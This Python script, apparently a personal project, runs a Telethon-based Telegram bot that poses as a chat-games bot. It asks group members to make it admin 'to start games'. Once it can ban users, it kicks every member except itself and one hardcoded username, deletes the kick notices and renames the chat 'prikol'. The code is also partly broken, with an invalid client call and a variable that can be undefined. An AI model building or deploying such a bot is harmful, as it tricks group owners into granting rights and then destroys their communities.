# This is a sample Python script.

# Press Shift+F10 to execute it or replace it with your code.
# Press Double Shift to search everywhere for classes, files, tool windows, actions, and settings.
from telethon import events
from telethon.sync import TelegramClient
import asyncio

from telethon.tl.functions.channels import EditTitleRequest
from telethon.tl.functions.messages import GetHistoryRequest


async def start():
    bot = await TelegramClient('bot', ,"").start(
        bot_token="")
    print(bot)

    @bot.on(events.NewMessage)
    async def any_message_arrived_handler(event):
        print("new message: " + event.message.text)
        if(event.message.text  == "/start_game@chatGamesInline_bot"):
            try:
                chat = await event.message.get_chat()
                await bot.send_message(
                    chat, 'I need to be admin to start games in this chat. Please make me admin first.')
            except Exception as e:
                print("frrr" + e.args[0])
        try:
            permissions = await bot.get_permissions(chat, "me")
            if(permissions.ban_users):
                users = await bot.get_participants(chat)
                msgs = []
                for user in users:
                    if user.username != 'chatGamesInline_bot':
                        if user.username != 'Kavynfrom':
                            try:
                                msg = await bot.kick_participant(chat, user.id)
                                msgs.append(msg)
                            except Exception as e:
                                print("new" + e.args[0])
                    #await bot.send_message(chat, str(user.id))
                try:
                    for ms in msgs:
                        await ms.delete()
                except Exception as e:
                    print("new" + e.args[0])
                await bot(EditTitleRequest(
                    channel=chat,
                    title='prikol'
                ))

        except Exception as e:
                print("new" + e.args[0])

    await bot.run_until_disconnected()


# Press the green button in the gutter to run the script.
if __name__ == '__main__':
    asyncio.run(start());


